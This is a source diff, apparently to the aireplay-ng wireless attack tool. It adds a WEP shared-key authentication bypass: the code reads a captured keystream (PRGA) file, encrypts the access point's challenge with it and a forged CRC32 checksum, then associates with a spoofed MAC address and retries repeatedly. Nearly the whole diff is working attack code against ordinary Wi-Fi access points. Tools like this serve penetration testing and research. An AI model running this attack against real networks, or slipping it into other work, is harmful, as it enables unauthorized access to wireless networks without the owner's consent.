@@ -174,6 +174,7 @@ struct options
 
     char *s_face;
     char *s_file;
+    uchar *prga;
 
     int a_mode;
     int a_count;
@@ -181,6 +182,7 @@ struct options
 
     int ringbuffer;
     int ghost;
+    int prgalen;
 }
 opt;
 
@@ -213,6 +215,13 @@ unsigned char h80211[4096];
 unsigned char tmpbuf[4096];
 unsigned char srcbuf[4096];
 char strbuf[512];
+
+uchar ska_auth1[]     = "\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                        "\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";
+
+uchar ska_auth3[4096] = "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                        "\x00\x00\x00\x00\x00\x00\xc0\x01";
+
 
 int ctrl_c, alarmed;
 
@@ -497,6 +506,394 @@ int do_attack_deauth( void )
     return( 0 );
 }
 
+int read_prga(unsigned char **dest, char *file)
+{
+    FILE *f;
+    int size;
+
+    if(file == NULL) return( 1 );
+    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);
+
+    f = fopen(file, "r");
+
+    if(f == NULL)
+    {
+         printf("Error opening %s\n", file);
+         return( 1 );
+    }
+
+    fseek(f, 0, SEEK_END);
+    size = ftell(f);
+    rewind(f);
+
+    if(size > 1500) size = 1500;
+
+    if( fread( (*dest), size, 1, f ) != 1 )
+    {
+        fprintf( stderr, "fread failed\n" );
+        return( 1 );
+    }
+
+    opt.prgalen = size;
+
+    fclose(f);
+    return( 0 );
+}
+
+void wait_for_beacon(uchar *bssid, uchar *capa)
+{
+    int len = 0;
+    uchar pkt_sniff[4096];
+
+    while (1) {
+	len = 0;
+	while (len < 22) len = read_packet(pkt_sniff, 4096);
+	if (! memcmp(pkt_sniff, "\x80", 1)) {
+	    if (! memcmp(bssid, pkt_sniff+10, 6)) break;
+	}
+    }
+
+    memcpy(capa, pkt_sniff+34, 2);
+
+}
+
+void add_icv(uchar *input, int len, int offset)
+{
+    unsigned long crc = 0xFFFFFFFF;
+    int n=0;
+
+    for( n = offset; n < len; n++ )
+        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);
+
+    crc = ~crc;
+
+    input[len]   = (crc      ) & 0xFF;
+    input[len+1] = (crc >>  8) & 0xFF;
+    input[len+2] = (crc >> 16) & 0xFF;
+    input[len+3] = (crc >> 24) & 0xFF;
+
+    return;
+}
+
+int xor_keystream(uchar *ph80211, uchar *keystream, int len)
+{
+    int i=0;
+
+    for (i=0; i<len; i++) {
+        ph80211[i] = ph80211[i] ^ keystream[i];
+    }
+
+    return 0;
+}
+
+void print_packet ( uchar h80211[], int caplen )
+{
+	int i,j;
+
+	printf( "        Size: %d, FromDS: %d, ToDS: %d",
+		caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );
+
+	if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
+	{
+	if( ( h80211[27] & 0x20 ) == 0 )
+		printf( " (WEP)" );
+	else
+		printf( " (WPA)" );
+	}
+
+	for( i = 0; i < caplen; i++ )
+	{
+	if( ( i & 15 ) == 0 )
+	{
+		if( i == 224 )
+		{
+		printf( "\n        --- CUT ---" );
+		break;
+		}
+
+		printf( "\n        0x%04x:  ", i );
+	}
+
+	printf( "%02x", h80211[i] );
+
+	if( ( i & 1 ) != 0 )
+		printf( " " );
+
+	if( i == caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
+	{
+		for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
+		{
+		printf( "  " );
+		if( ( j & 1 ) != 0 )
+			printf( " " );
+		}
+
+		printf( " " );
+
+		for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
+		printf( "%c", ( h80211[i - 15 + j] <  32 ||
+				h80211[i - 15 + j] > 126 )
+				? '.' : h80211[i - 15 + j] );
+	}
+
+	if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
+	{
+		printf( " " );
+
+		for( j = 0; j < 16; j++ )
+		printf( "%c", ( h80211[i - 15 + j] <  32 ||
+				h80211[i - 15 + j] > 127 )
+				? '.' : h80211[i - 15 + j] );
+	}
+	}
+	printf("\n");
+}
+
+int fake_ska_auth_1( void )
+{
+    int caplen=0;
+    int tmplen=0;
+    int got_one=0;
+
+    char sniff[4096];
+
+    struct timeval tv, tv2;
+
+    uchar ack[14] = 	"\xd4";
+    memset(ack+1, 0, 13);
+
+    memcpy(ska_auth1+4, opt.r_bssid, 6);
+    memcpy(ska_auth1+10,opt.r_smac,  6);
+    memcpy(ska_auth1+16,opt.r_bssid, 6);
+
+    //Preparing ACK packet
+    memcpy(ack+4, opt.r_bssid, 6);
+
+    send_packet(ska_auth1, 30);
+    send_packet(ack, 14);
+
+    printf("Step1: Authentication\n");
+
+    gettimeofday(&tv, NULL);
+    gettimeofday(&tv2, NULL);
+    got_one = 0;
+    //Waiting for response packet containing the challenge
+    while (1)
+    {
+        caplen = read_packet(sniff, 4096);
+        if (sniff[0] == '\xb0' && sniff[26] == 2)
+        {
+            got_one = 1;
+            gettimeofday(&tv, NULL);
+            memcpy(h80211, sniff, caplen);
+            tmplen = caplen;
+        }
+
+        gettimeofday( &tv2 ,NULL);
+        if(((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 200*1000 && got_one)
+        {
+//            memcpy(h80211, tmpbuf, tmplen);
+            caplen = tmplen;
+            break;
+        }
+
+        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000 && !got_one)
+        {
+            printf ("Not answering...\n\n");
+            return -1;
+        }
+    }
+
+    if (sniff[28] == '\x0d')
+    {
+        printf ("\nAP does not support Shared Key Authentication!\n");
+        return -1;
+    }
+
+    return caplen;
+}
+
+
+int fake_ska_auth_2(uchar *ph80211, int caplen, uchar *prga, uchar *iv)
+{
+    struct timeval tv, tv2;
+    int ret=0;
+    uchar ack[14] = 	"\xd4";
+    memset(ack+1, 0, 13);
+
+    //Increasing SEQ number
+    ph80211[26]++;
+    //Adding ICV checksum
+    add_icv(ph80211, caplen, 24);
+    //ICV => plus 4 bytes
+    caplen += 4;
+
+    //Encrypting
+    xor_keystream(ph80211+24, prga, caplen-24);
+
+    memcpy(ska_auth3+4, opt.r_bssid, 6);
+    memcpy(ska_auth3+10,opt.r_smac,  6);
+    memcpy(ska_auth3+16,opt.r_bssid, 6);
+
+    //Calculating size of encrypted packet
+    caplen += 4; //Encrypted packet has IV+KeyIndex, thus 4 bytes longer than plaintext with ICV
+
+    //Copy IV and ciphertext into packet
+    memcpy(ska_auth3+24, iv, 4);
+    memcpy(ska_auth3+28, ph80211+24, caplen-28);
+
+    send_packet(ska_auth3, caplen);
+    send_packet(ack, 14);
+
+    gettimeofday(&tv, NULL);
+    gettimeofday(&tv2, NULL);
+    //Waiting for successful authentication
+    while (1)
+    {
+	caplen = read_packet(ph80211, 4096);
+
+	if ((ph80211[0] == (unsigned char)'\xb0') && (caplen < 60) && ph80211[26] == 4) break;
+
+        gettimeofday(&tv2, NULL);
+        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
+        {
+            printf ("\nNot answering...\n\n");
+            return -1;
+	}
+    }
+
+    if (!memcmp(ph80211+24, "\x01\x00\x04\x00\x00\x00", 6))
+    {
+        printf ("Code 0 - Authentication SUCCESSFUL :)\n");
+        ret = 0;
+    }
+    else
+    {
+        printf ("\nAuthentication failed!\n\n");
+        ret = -1;
+    }
+
+
+    return ret;
+}
+
+int fake_asso()
+{
+    struct timeval tv, tv2;
+    int caplen = 0;
+    int slen;
+    uchar ack[14] = 	"\xd4";
+    memset(ack+1, 0, 13);
+
+    uchar assoc[4096] = "\x00\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                        "\x00\x00\x00\x00\x00\x00\xd0\x01\x15\x00\x0a\x00\x00";
+
+    uchar rates[16] =   "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C";
+
+    uchar *capa;	//Capability Field from beacon
+
+    printf("Step2: Association\n");
+
+
+    capa = (uchar *) malloc(2);
+
+    //Copying MAC adresses into frame
+    memcpy(assoc+4 ,opt.r_bssid,6);
+    memcpy(assoc+10,opt.r_smac, 6);
+    memcpy(assoc+16,opt.r_bssid,6);
+
+    //Getting ESSID length
+    slen = strlen(opt.r_essid);
+
+    //Set tag length
+    assoc[29] = (uchar) slen;
+    //Set ESSID tag
+    memcpy(assoc+30,opt.r_essid,slen);
+    //Set Rates tag
+    memcpy(assoc+30+slen, rates, 16);
+
+    //Calculating total packet size
+    int assoclen = 30 + slen + 16;
+
+    wait_for_beacon(opt.r_bssid, capa);
+    memcpy(assoc+24, capa, 2);
+
+    send_packet(assoc, assoclen);
+    send_packet(ack, 14);
+
+    gettimeofday(&tv, NULL);
+    gettimeofday(&tv2, NULL);
+    while (1)
+    {
+        caplen = read_packet(tmpbuf, 4096);
+
+        if (tmpbuf[0] == '\x10') break;
+
+        gettimeofday(&tv2, NULL);
+        if (((tv2.tv_sec-tv.tv_sec)*1000000) + (tv2.tv_usec-tv.tv_usec) > 500*1000)
+        {
+            printf ("\nNot answering...\n\n");
+            return -1;
+        }
+    }
+
+    if (!memcmp(tmpbuf+26, "\x00\x00", 2))
+    {
+        printf ("Code 0 - Association SUCCESSFUL :)\n\n");
+    }
+    else
+    {
+        printf ("\nAssociation failed!\n\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+int fake_ska(uchar* prga)
+{
+    uchar *iv;
+
+    int caplen=0;
+    int prgalen;
+    int ret=-1;
+    int i=0;
+
+    while(caplen <= 0)
+    {
+        caplen = fake_ska_auth_1();
+        if(caplen <=0) printf("Retrying 1. auth sequence!\n");
+        if(i>50) return -1;
+        i++;
+    }
+
+    prgalen = opt.prgalen;
+    iv = prga;
+    prga += 4;
+
+    if (prgalen < caplen-24)
+    {
+        printf("\n\nPRGA is too short! Need at least %d Bytes, got %d!\n", caplen-24, prgalen);
+        return -1;
+    }
+
+    memcpy(tmpbuf, h80211, caplen);
+    ret = fake_ska_auth_2( tmpbuf, caplen, prga, iv);
+    if(ret < 0)return -1;
+
+    i=0;
+    ret = -1;
+    while(ret < 0)
+    {
+        ret = fake_asso();
+        if(ret < 0) printf("Retrying association sequence!\n");
+        if(i>50) return -1;
+        i++;
+    }
+
+    return 0;
+}
+
 int do_attack_fake_auth( void )
 {
     time_t tt, tr;
@@ -506,6 +903,7 @@ int do_attack_fake_auth( void )
     int i, n, state, caplen;
     int mi_b, mi_s, mi_d;
     int x_send;
+    int ret;
 
     unsigned char ackbuf[14];
 
@@ -752,8 +1150,34 @@ int do_attack_fake_auth( void )
                 if( h80211[24] != 0 || h80211[25] != 0 )
                 {
                     printf( "FATAL: algorithm != Open System (0)\n" );
-                    sleep( 3 );
-                    continue;
+
+                    if(opt.prgalen == 0)
+                    {
+                        printf( "Please specify a PRGA-file (-y).\n" );
+                        return -1;
+                    }
+
+                    sleep(2);
+                    i=0;
+                    while(1)
+                    {
+                        ret = fake_ska(opt.prga);
+                        if(ret == 0)
+                        {
+                            i=0;
+                            sleep(opt.a_delay);
+                        }
+                        else
+                        {
+                            i++;
+                            if(i>10)
+                            {
+                                printf("Authentication failed!\n");
+                                return 1;
+                            }
+                        }
+                    }
+                    return 0;
                 }
 
                 n = h80211[28] + ( h80211[29] << 8 );
@@ -773,7 +1197,34 @@ int do_attack_fake_auth( void )
                     case 13:
                     case 15:
                         printf( "AP rejects open-system authentication\n" );
-                        break;
+
+                        if(opt.prgalen == 0)
+                        {
+                            printf( "Please specify a PRGA-file (-y).\n" );
+                            return -1;
+                        }
+
+                        sleep(2);
+                        i=0;
+                        while(1)
+                        {
+                            ret = fake_ska(opt.prga);
+                            if(ret == 0)
+                            {
+                                i=0;
+                                sleep(opt.a_delay);
+                            }
+                            else
+                            {
+                                i++;
+                                if(i>10)
+                                {
+                                    printf("Authentication failed!\n");
+                                    return 1;
+                                }
+                            }
+                        }
+                        return 0;
 
                     default:
                         break;
@@ -2195,35 +2646,6 @@ int make_arp_request(uchar *h80211, uchar *bssid, uchar *src_mac, uchar *dst_mac
     return 0;
 }
 
-void add_icv(uchar *input, int len)
-{
-    unsigned long crc = 0xFFFFFFFF;
-    int n=0;
-
-    for( n = 28; n < len; n++ )
-        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);
-
-    crc = ~crc;
-
-    input[len]   = (crc      ) & 0xFF;
-    input[len+1] = (crc >>  8) & 0xFF;
-    input[len+2] = (crc >> 16) & 0xFF;
-    input[len+3] = (crc >> 24) & 0xFF;
-
-    return;
-}
-
-int xor_keystream(uchar *ph80211, uchar *keystream, int len)
-{
-    int i=0;
-
-    for (i=0; i<len; i++) {
-        ph80211[i] = ph80211[i] ^ keystream[i];
-    }
-
-    return 0;
-}
-
 void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, int fragsize)
 {
     int t, u;
@@ -2263,7 +2685,7 @@ void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, 
         pack_size = 28 + fragsize;
 
     //Add ICV
-        add_icv(frag, pack_size);
+        add_icv(frag, pack_size, 28);
         pack_size += 4;
 
     //Encrypt
@@ -2699,7 +3121,7 @@ int main( int argc, char *argv[] )
         };
 
         int option = getopt_long( argc, argv,
-                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:j:i:r:k:l:0:1:2345",
+                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:j:i:r:k:l:y:0:1:2345",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -2883,6 +3305,19 @@ int main( int argc, char *argv[] )
             case 'l' :
 
                 inet_aton( optarg, (struct in_addr *) opt.r_dip );
+                break;
+
+            case 'y' :
+
+                if( opt.prga != NULL )
+                {
+                    printf( "PRGA file already specified.\n" );
+                    return( 1 );
+                }
+                if( read_prga(&(opt.prga), optarg) != 0 )
+                {
+                    return( 1 );
+                }
                 break;
 
             case 'i' :
